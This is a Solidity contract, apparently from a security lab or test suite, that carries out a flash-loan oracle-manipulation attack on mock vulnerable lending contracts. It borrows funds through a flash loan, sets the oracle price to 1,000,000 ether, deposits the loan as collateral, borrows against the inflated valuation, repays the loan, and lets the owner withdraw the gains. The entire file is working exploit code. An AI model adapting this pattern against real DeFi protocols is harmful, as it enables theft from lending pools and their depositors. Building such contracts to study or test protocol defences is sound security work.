// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../interfaces/IERC20Minimal.sol";

interface IVulnerableFlashLoan {
    function flashLoan(uint256 amount, address receiver, bytes calldata data) external;
}

interface IVulnerableOracle {
    function setPrice(uint256 _price) external;
}

interface IVulnerableLending {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
}

contract FlashLoanOracleAttacker {
    address public owner;
    bool public borrowed;
    bool public manipulated;
    bool public exploited;
    bool public repaid;

    address private flashLoanPool;
    address private flashLoanToken;
    address private flashLoanAmm;
    address private oracle;
    address private lending;
    uint256 private borrowAmount;
    uint256 private flashLoanAmount;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function attack(
        address _flashLoanPool,
        address _token,
        address _amm,
        address _oracle,
        address _lending,
        uint256 _borrowAmount
    ) external onlyOwner {
        flashLoanPool = _flashLoanPool;
        flashLoanToken = _token;
        flashLoanAmm = _amm;
        oracle = _oracle;
        lending = _lending;
        borrowAmount = _borrowAmount;
        borrowed = false;
        manipulated = false;
        exploited = false;
        repaid = false;

        bytes memory data = abi.encodeWithSignature("callback()");
        IVulnerableFlashLoan(_flashLoanPool).flashLoan(_borrowAmount, address(this), data);
    }

    function callback() external {
        require(msg.sender == flashLoanPool, "Not authorized");
        borrowed = true;
        flashLoanAmount = IERC20Minimal(flashLoanToken).balanceOf(address(this));

        IVulnerableOracle(oracle).setPrice(1_000_000 ether);
        manipulated = true;

        IERC20Minimal(flashLoanToken).approve(lending, flashLoanAmount);
        IVulnerableLending(lending).depositCollateral(flashLoanAmount);
        IVulnerableLending(lending).borrow(borrowAmount);
        exploited = true;

        IERC20Minimal(flashLoanToken).transfer(flashLoanPool, flashLoanAmount);
        repaid = true;
    }

    function getState() external view returns (bool, bool, bool, bool) {
        return (borrowed, manipulated, exploited, repaid);
    }

    function withdrawToken(address token, uint256 amount) external onlyOwner {
        IERC20Minimal(token).transfer(owner, amount);
    }
}
